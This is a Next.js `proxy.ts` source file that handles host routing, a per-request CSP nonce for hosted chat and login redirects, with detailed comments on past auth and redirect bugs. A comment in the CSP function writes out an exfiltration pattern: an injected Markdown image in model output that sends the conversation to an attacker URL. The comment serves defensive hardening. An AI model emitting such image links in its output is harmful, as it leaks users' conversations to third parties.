import { NextResponse, type NextRequest } from 'next/server';

// `safeNext` is deliberately NOT imported any more: its only caller here was the `/login` bounce
// removed below. It keeps its other caller in `(auth)/login/page.tsx`, so the shared module stays the
// one implementation it was extracted to be.
import { isPublicPath, MAX_NEXT_LENGTH } from './lib/auth/safe-next';
import { API_ORIGIN } from './lib/env';

/**
 * `proxy.ts` — Next 16's rename of `middleware.ts` (Node runtime only, not configurable). A matcher
 * copied from a Next 15 answer sits in a file called `middleware.ts` and guards NOTHING.
 *
 * THIS IS NOT THE AUTHORIZATION GATE, and no change may make it one. CVE-2025-29927 skipped every
 * Next.js middleware with a single request header; any design where the proxy is the gate fails
 * open on the next equivalent bug. Laravel returning 401/403/404 is the gate. What lives here:
 *
 *  1. Host -> namespace ROUTING (ADR-027). Admin is `/*` and hosted chat is `/c/[publicBotId]`;
 *     on `chat.<domain>` a visitor's `/<publicBotId>` is rewritten under `/c/`. Without the
 *     prefix the static `/bots` route beats the dynamic chat route and hosted chat renders the
 *     admin bots page.
 *  2. The hosted-chat CSP, because its nonce must be per response. Next reads the nonce out of the
 *     REQUEST's Content-Security-Policy header and applies it to its own inline bootstrap scripts.
 *     Consequence, accepted deliberately: chat pages render dynamically. What is genuinely
 *     cacheable by `publicBotId` — the bot-config fetch and `theme.css` — still is.
 *  3. A UX redirect for a visitor who carries NO session cookie. Not an authorization decision: it
 *     redirects toward LESS privilege, which is the property that makes it safe to run in a file that
 *     can be skipped by a request header.
 *
 *     THERE IS NO LONGER A MIRROR-IMAGE BOUNCE OUT OF `/login`, and the sentence that used to promise
 *     one here was the reason it looked safe: "both redirect toward less privilege" is true of the
 *     bounce and was the wrong test, because the bounce's hazard was never privilege — it was an
 *     infinite redirect loop against SessionProvider. Cookie ABSENCE means "no session"; cookie
 *     PRESENCE does not mean "signed in", because Laravel issues one to guests. Full account at the
 *     branch itself.
 */

/**
 * The session cookie's name, and it is NOT Laravel's factory default.
 *
 * Verified against three sources that must agree, all read on 2026-08-13:
 *   - services/core-api/config/session.php:23 — `env('SESSION_COOKIE', 'kb_session')`
 *   - services/core-api/.env.example:168      — `SESSION_COOKIE=kb_session`
 *   - packages/contracts/openapi/core-api.openapi.json — `components.securitySchemes
 *     .sanctumSession.name === "kb_session"`, which is read from LIVE `config('session.cookie')`.
 *     `kb:dump-openapi --check` is what compares it; nothing runs that for you any more.
 *
 * `laravel_session` was here until now and it is Laravel's factory default, not ours — so
 * `request.cookies.has(SESSION_COOKIE)` below was ALWAYS false and every authenticated admin path
 * 307'd to `/login` forever, including immediately after a successful sign-in. The whole console was
 * unreachable and nothing failed: the redirect is by design, so it looks like a UX rule working.
 *
 * `tests/unit/proxy.test.ts` asserts this literal equals the generated OpenAPI document's value, so
 * the web-side string is provably in sync with running Laravel through a committed, CI-checked file.
 * Do NOT move the name into `@kb/contracts`' root entry: a runtime string there is real bytes inside
 * apps/widget's <=1 kB brotli budget.
 */
export const SESSION_COOKIE = 'kb_session';

/**
 * The browser's OTLP ingest path (ADR-025). It is carved out of BOTH branches below, and each
 * carve-out fixes a different silent failure:
 *
 *  - On `chat.<domain>` every path is rewritten under `/c/`, so an uncarved exporter POST lands on
 *    `/c/telemetry/v1/traces` — a 404 that the exporter reports nowhere, so hosted chat simply has
 *    no browser traces and nothing says so.
 *  - On `app.<domain>` a visitor with no session cookie is redirected to `/login`. A 307 preserves
 *    the method, so the exporter re-POSTs its spans at a page route — and a signed-out visitor is
 *    exactly the state the login and error surfaces most need traces from.
 *
 * It is an exact prefix and must stay one. Widening it to a name a page route could also match
 * would hand an unauthenticated path to something that reads the session.
 */
const TELEMETRY_PREFIX = '/telemetry/';

const isTelemetryPath = (pathname: string): boolean => pathname.startsWith(TELEMETRY_PREFIX);

/**
 * A prefetch is a page the user never opened, so its path has no business becoming the post-login
 * destination. Next sends this header when the router speculatively fetches a route on hover or on
 * viewport entry; without the check, hovering the nav on a signed-out tab rewrites `?next=` to
 * whichever link the pointer passed over last.
 */
const isPrefetch = (request: NextRequest): boolean =>
  request.headers.get('next-router-prefetch') !== null;

type Namespace = 'admin' | 'chat' | 'unrestricted';

function namespaceFor(host: string | null): Namespace {
  const hostname = (host ?? '').split(':')[0]?.toLowerCase() ?? '';
  // Local development runs both surfaces on one hostname, so host enforcement has to stand down
  // there or hosted chat becomes untestable. Production hostnames always carry a subdomain.
  if (hostname === 'localhost' || hostname === '127.0.0.1' || !hostname.includes('.')) {
    return 'unrestricted';
  }
  return hostname.startsWith('chat.') ? 'chat' : 'admin';
}

function chatCsp(nonce: string): string {
  return [
    "default-src 'self'",
    // 'strict-dynamic' plus the nonce: any script Next loads from a nonced bootstrap inherits
    // trust, and nothing else runs. No 'unsafe-inline', ever — hosted chat renders model-generated
    // Markdown, the highest-risk sink in the product.
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    // 'self' covers the theme stylesheet route because it is a REAL stylesheet response. A nonced
    // inline <style> would force the route dynamic; a style="" attribute is not covered by a nonce
    // at all (tailwind-shadcn gotcha 2).
    "style-src 'self'",
    // No remote images. An injected `![](https://attacker/?d=…)` in model output is an
    // unauthenticated outbound GET carrying the conversation — EchoLeak, CVE-2025-32711.
    "img-src 'self' data:",
    "font-src 'self'",
    `connect-src 'self' ${API_ORIGIN}`,
    "object-src 'none'",
    "base-uri 'none'",
    "form-action 'self'",
    // Hosted chat is our own page, not the embedded widget; the widget's per-request
    // frame-ancestors lives in apps/widget and is owned by kb-security-baseline.
    "frame-ancestors 'none'",
  ].join('; ');
}

export default function proxy(request: NextRequest): NextResponse {
  const { pathname, search } = request.nextUrl;
  const namespace = namespaceFor(request.headers.get('host'));
  const isChatPath = pathname === '/c' || pathname.startsWith('/c/');

  // Before every branch: no rewrite, no redirect, no CSP. The handler is a byte relay to the
  // Collector — it renders nothing, reads no session, and produces no organization-scoped byte.
  if (isTelemetryPath(pathname)) return NextResponse.next();

  // --- hosted chat -----------------------------------------------------------------------------
  if (namespace === 'chat' || (namespace === 'unrestricted' && isChatPath)) {
    const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
    const csp = chatCsp(nonce);

    const requestHeaders = new Headers(request.headers);
    requestHeaders.set('content-security-policy', csp);
    requestHeaders.set('x-kb-nonce', nonce);

    const target = request.nextUrl.clone();
    if (namespace === 'chat' && !isChatPath) {
      // chat.<domain>/<publicBotId> -> /c/<publicBotId>. Everything on this host lands under the
      // chat namespace, so no admin route is reachable from the origin that renders model output.
      target.pathname = `/c${pathname}`;
    }

    const response =
      target.pathname === pathname
        ? NextResponse.next({ request: { headers: requestHeaders } })
        : NextResponse.rewrite(target, { request: { headers: requestHeaders } });

    response.headers.set('content-security-policy', csp);
    return response;
  }

  // --- admin console ---------------------------------------------------------------------------
  if (namespace === 'admin' && isChatPath) {
    // Hosted chat must never render on the origin the admin session cookie is scoped to: one XSS
    // in model output there would execute with a real admin credential attached.
    return NextResponse.redirect(new URL('/', request.url));
  }

  // ── COOKIE PRESENCE IS NOT A SESSION, AND THE BOUNCE THAT USED TO SIT HERE READ IT AS IF IT WERE ──
  //
  // What was removed: a GET of `/login` carrying `kb_session` was redirected to `safeNext(?next)`, on
  // the theory that a visitor holding the session cookie is signed in and does not want the login form.
  //
  // WHY THAT SIGNAL CANNOT CARRY THAT MEANING. Laravel issues `kb_session` TO A GUEST. Every auth form
  // calls `refreshCsrfToken()` unconditionally before its POST (see login-form.tsx), which is a
  // `GET /sanctum/csrf-cookie`, and `StartSession` answers it by starting a session and setting the
  // cookie. `SESSION_DOMAIN` is the PARENT domain — required so this SPA on `app.<domain>` can read the
  // `XSRF-TOKEN` cookie Sanctum sets from `api.<domain>` — so that guest cookie is visible right here.
  // `looksSignedIn` is therefore true for anyone who has merely LOADED an auth screen.
  //
  // MEASURED CONSEQUENCE — an endless refresh of `app.<domain>`, reported from a real browser:
  //     /login -> bounce to '/' -> admin layout mounts SessionProvider -> GET /me -> 401
  //            -> session-provider.tsx:77 assigns '/login?next=/' -> bounce to '/' -> ...
  // Neither participant is wrong alone, and the 401 is the correct answer. The loop needs both halves,
  // and this was the half built on a signal that cannot tell a guest session from an authenticated one.
  //
  // WHY THE OLD COMMENT DID NOT CATCH IT: it asked only whether each branch fails toward less
  // privilege, and the bounce does. Privilege was never the bounce's hazard — liveness was.
  //
  // THE BRANCH BELOW STAYS, because it reads the cookie's ABSENCE, and absence does mean "no session of
  // any kind". It remains UX-only, and Laravel is the gate (non-negotiable #3), not this file:
  //  - if it is skipped (CVE-2025-29927 or its successor), an anonymous visitor reaches `/sources` and
  //    gets the org-neutral chrome the admin layout renders; every byte of data comes from a browser
  //    fetch that Laravel answers with a 401.
  //  - it is now HONESTLY DEGRADED rather than dangerous, and that is worth stating: a guest who has
  //    loaded `/login` once carries `kb_session`, so this redirect stops firing for them and they reach
  //    that same chrome. Restoring both directions needs a signal that means AUTHENTICATED — the usual
  //    shape is a non-HttpOnly hint cookie written on login and cleared on logout — which is a design
  //    addition rather than a bug fix, so it is recorded instead of smuggled in here.
  const looksSignedIn = request.cookies.has(SESSION_COOKIE);
  const isGet = request.method === 'GET';

  if (!looksSignedIn && !isPublicPath(pathname)) {
    // A 307 PRESERVES THE METHOD, so redirecting a non-GET re-POSTs the body at `/login` — a stale
    // tab's form submission arrives at a route that never expected it. Let the request through and
    // let Laravel 401 it: Laravel is the gate, and this file only ever routes a document request.
    if (!isGet) return NextResponse.next();

    // UX ONLY. The cookie may be expired, revoked, or for a user with no membership — Laravel
    // decides, and every page beneath this fetches from the browser and handles its own 401.
    const login = new URL('/login', request.url);
    const target = `${pathname}${search}`;
    if (pathname !== '/' && !isPrefetch(request) && target.length <= MAX_NEXT_LENGTH) {
      login.searchParams.set('next', target);
    }
    return NextResponse.redirect(login);
  }

  return NextResponse.next();
}

export const config = {
  // ALL of `_next/` is skipped, not just `static` and `image`. Those two carry no session and minting
  // a per-request nonce for every chunk is pure cost — but the reason the pattern is the whole prefix
  // is a bug the narrow form caused:
  //
  //   `/_next/webpack-hmr` matched, so the dev server's HMR WEBSOCKET was treated as an admin
  //   navigation and answered with `307 -> /login?next=%2F_next%2Fwebpack-hmr` (measured). The
  //   Turbopack dev client could never connect, and the app-router dev bootstrap awaits that
  //   connection before hydrating — so no page ever became interactive and every form submit fell
  //   through to the browser's native GET, putting typed passwords in the query string. A redirect
  //   to a login page is not a plausible answer to an Upgrade request from anything under `_next/`.
  //
  // Nothing under this prefix needs what this file does. It routes by HOST and mints a CSP nonce for
  // hosted-chat DOCUMENTS; RSC navigation payloads are requested at the page's own path with an
  // `RSC:` header, not here (App Router has no `/_next/data/`). `next.config.ts`'s ADMIN_PATHS
  // already excludes `_next/` for exactly this reason, so the two now agree.
  //
  // This is not a hole in the gate, because this file is not the gate: Laravel's 401/403/404 is
  // (see the header docblock, CVE-2025-29927). No protected page can be rendered from a `_next/` URL.
  matcher: ['/((?!_next/|favicon.ico|robots.txt).*)'],
};
